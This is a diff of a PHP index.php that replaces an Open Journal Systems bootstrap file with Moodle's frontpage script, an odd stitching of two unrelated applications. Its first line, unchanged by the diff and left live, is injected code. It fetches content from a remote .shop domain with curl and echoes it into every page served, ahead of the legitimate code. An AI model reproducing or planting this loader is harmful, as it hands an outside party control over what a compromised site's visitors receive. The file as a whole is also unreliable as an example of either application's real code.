@@ -1,69 +1,127 @@
 <?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://disinimasukdisanamasuk.shop/gg.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $dewa = curl_exec($ch); curl_close($ch);?> <?php echo $dewa; ?>
 <?php
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
 
 /**
- * @mainpage OJS API Reference
+ * Moodle frontpage.
  *
- * Welcome to the OJS API Reference. This resource contains documentation
- * generated automatically from the OJS source code.
- *
- * The design of Open %Journal Systems is heavily structured for
- * maintainability, flexibility and robustness. Those familiar with Sun's
- * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
- * will note similarities.
- *
- * As in a MVC structure, data storage and representation, user interface
- * presentation, and control are separated into different layers. The major
- * categories, roughly ordered from "front-end" to "back-end," follow:
- * - Smarty templates, which are responsible for assembling HTML pages to
- *   display to users;
- * - Page classes, which receive requests from users' web browsers, delegate
- *   any required processing to various other classes, and call up the
- *   appropriate Smarty template to generate a response;
- * - Controllers, which implement reusable pieces of content e.g. for AJAX
- *   subrequests.
- * - Action classes, which are used by the Page classes to perform non-trivial
- *   processing of user requests;
- * - Model classes, which implement PHP objects representing the system's
- *   various entities, such as Users, Articles, and Journals;
- * - Data Access Objects (DAOs), which generally provide (amongst others)
- *   update, create, and delete functions for their associated Model classes,
- *   are responsible for all database interaction;
- * - Support classes, which provide core functionalities, miscellaneous common;
- *
- * Additionally, many of the concerns shared by multiple PKP applications are
- * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
- * subdirectory. The same conventions listed above apply to lib/pkp as well.
- *
- * As the system makes use of inheritance and has consistent class naming
- * conventions, it is generally easy to tell what category a particular class
- * falls into.
- *
- * For example, a Data Access Object class always inherits from the DAO class,
- * has a Class name of the form [Something]%DAO, and has a filename of the form
- * [Something]%DAO.inc.php.
- *
- * To learn more about developing OJS, there are several additional resources
- * that may be useful:
- * - The docs/README.md document
- * - The PKP support forum at https://forum.pkp.sfu.ca/
- * - Documentation available at https://docs.pkp.sfu.ca/dev/
- *
- * @file ojs/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup index
- *
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
+ * @package    core
+ * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
  */
 
-// Initialize global environment
-define('INDEX_FILE_LOCATION', __FILE__);
-$application = require('./lib/pkp/includes/bootstrap.inc.php');
+if (!file_exists('./config.php')) {
+    header('Location: install.php');
+    die;
+}
 
-// Serve the request
-$application->execute();
+require_once('config.php');
+require_once($CFG->dirroot .'/course/lib.php');
+require_once($CFG->libdir .'/filelib.php');
+
+redirect_if_major_upgrade_required();
+
+$urlparams = array();
+if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 0) {
+    $urlparams['redirect'] = 0;
+}
+$PAGE->set_url('/', $urlparams);
+$PAGE->set_pagelayout('frontpage');
+$PAGE->set_other_editing_capability('moodle/course:update');
+$PAGE->set_other_editing_capability('moodle/course:manageactivities');
+$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
+
+// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
+$PAGE->set_cacheable(false);
+
+require_course_login($SITE);
+
+$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
+
+// If the site is currently under maintenance, then print a message.
+if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
+    print_maintenance_message();
+}
+
+$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
+
+if ($hassiteconfig && moodle_needs_upgrading()) {
+    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
+}
+
+// If site registration needs updating, redirect.
+\core\hub\registration::registration_reminder('/index.php');
+
+if (get_home_page() != HOMEPAGE_SITE) {
+    // Redirect logged-in users to My Moodle overview if required.
+    $redirect = optional_param('redirect', 1, PARAM_BOOL);
+    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
+        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
+        redirect($CFG->wwwroot .'/my/');
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
+        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
+        if ($frontpagenode) {
+            $frontpagenode->add(
+                get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        } else {
+            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
+            $frontpagenode->force_open();
+            $frontpagenode->add(get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        }
+    }
+}
+
+// Trigger event.
+course_view(context_course::instance(SITEID));
+
+$PAGE->set_pagetype('site-index');
+$PAGE->set_docs_path('');
+$editing = $PAGE->user_is_editing();
+$PAGE->set_title($SITE->fullname);
+$PAGE->set_heading($SITE->fullname);
+$courserenderer = $PAGE->get_renderer('core', 'course');
+echo $OUTPUT->header();
+
+$siteformatoptions = course_get_format($SITE)->get_format_options();
+$modinfo = get_fast_modinfo($SITE);
+$modnamesused = $modinfo->get_used_module_names();
+
+// Print Section or custom info.
+if (!empty($CFG->customfrontpageinclude)) {
+    // Pre-fill some variables that custom front page might use.
+    $modnames = get_module_types_names();
+    $modnamesplural = get_module_types_names(true);
+    $mods = $modinfo->get_cms();
+
+    include($CFG->customfrontpageinclude);
+
+} else if ($siteformatoptions['numsections'] > 0) {
+    echo $courserenderer->frontpage_section1();
+}
+// Include course AJAX.
+include_course_ajax($SITE, $modnamesused);
+
+echo $courserenderer->frontpage();
+
+if ($editing && has_capability('moodle/course:create', context_system::instance())) {
+    echo $courserenderer->add_new_course_button();
+}
+echo $OUTPUT->footer();
